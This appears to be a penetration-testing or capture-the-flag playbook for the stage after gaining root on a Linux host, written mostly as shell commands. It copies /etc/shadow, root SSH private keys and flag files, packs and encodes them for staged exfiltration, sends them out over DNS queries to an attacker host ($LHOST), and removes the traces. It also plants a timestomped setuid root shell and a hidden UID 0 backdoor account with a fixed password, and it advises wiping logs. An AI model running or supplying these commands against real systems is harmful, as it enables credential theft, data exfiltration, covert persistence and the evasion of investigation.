# Privilege Escalation — Evidence Collection

## Purpose
Capture definitive proof of successful privilege escalation. All evidence must show pre-escalation context, exploit used, and post-escalation root status.

## Required Variables
- \$LHOST: attacker IP for reverse shells
- \$LPORT: attacker listener port

## Commands

```bash
id > /tmp/privesc_proof.txt && hostname >> /tmp/privesc_proof.txt && date >> /tmp/privesc_proof.txt

cat /etc/shadow > /tmp/shadow_hash.txt 2>/dev/null

cat /root/.ssh/id_rsa > /tmp/root_id_rsa.txt 2>/dev/null

cat /root/.ssh/authorized_keys > /tmp/root_auth_keys.txt 2>/dev/null || true

cat /root/flag.txt > /tmp/root_flag.txt 2>/dev/null || echo "No flag file found" | tee /tmp/root_flag.txt

cat /root/*.txt > /tmp/root_all_txt.txt 2>/dev/null || true

cat /etc/passwd > /tmp/passwd_copy.txt 2>/dev/null

cat /etc/shadow > /tmp/shadow_copy.txt 2>/dev/null

find /root -type f 2>/dev/null | head -100 > /tmp/root_file_list.txt

find /home -name "flag*.txt" -type f -exec cat {} \; 2>/dev/null | tee /tmp/flags_found.txt

history | tail -50 > /tmp/commands_run.txt

cp /tmp/linpeas_output.txt /tmp/privesc_evidence/ 2>/dev/null || true && cp /tmp/LinEnum.sh /tmp/privesc_evidence/ 2>/dev/null || true

tar -czf /tmp/privesc_evidence.tar.gz /tmp/privesc_proof.txt /tmp/shadow_hash.txt /tmp/root_id_rsa.txt /tmp/root_flag.txt /tmp/flags_found.txt /tmp/commands_run.txt /tmp/root_file_list.txt /tmp/shadow_copy.txt /tmp/passwd_copy.txt 2>/dev/null

base64 /tmp/privesc_evidence.tar.gz > /tmp/privesc_evidence.b64

split -b 4096 /tmp/privesc_evidence.b64 /tmp/ev_part_
```

For exfiltration via DNS (if HTTP blocked):

```bash
xxd -p -c 16 /tmp/privesc_evidence.tar.gz | while read line; do dig +short $line.data.$LHOST; done
```

Cleanup (do not leave evidence.tar.gz behind after exfiltration):

```bash
rm -f /tmp/privesc_evidence.tar.gz /tmp/privesc_evidence.b64 /tmp/ev_part_* 2>/dev/null
```

Post-exploit persistence (optional, only if authorized):

```bash
cp /bin/bash /tmp/.rootshell && chmod +s /tmp/.rootshell && touch -r /bin/bash /tmp/.rootshell

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadmin 2>/dev/null && echo 'sysadmin:chang3m3!' | chpasswd 2>/dev/null
```

## Detection Signals
- `id` output records `uid=0(root) gid=0(root)` with timestamp
- `/etc/shadow` content captured for offline hash cracking
- Root SSH private keys recoverable from `/root/.ssh/id_rsa`
- Flag files found and contents captured under both `/root/` and `/home/*/`
- Evidence tarball created, base64-encoded, and split for staged exfiltration
- Full command history preserved showing entire exploitation chain

## Next
├── Evidence tarball exfiltrated successfully → stop, deliver evidence to reporting
├── If exfiltration blocked → use split base64 + DNS channels or chunked POST
├── If persistence required → deploy root shell or backdoor user (only if authorized)
├── After evidence collection → wipe temp files and logs, exit session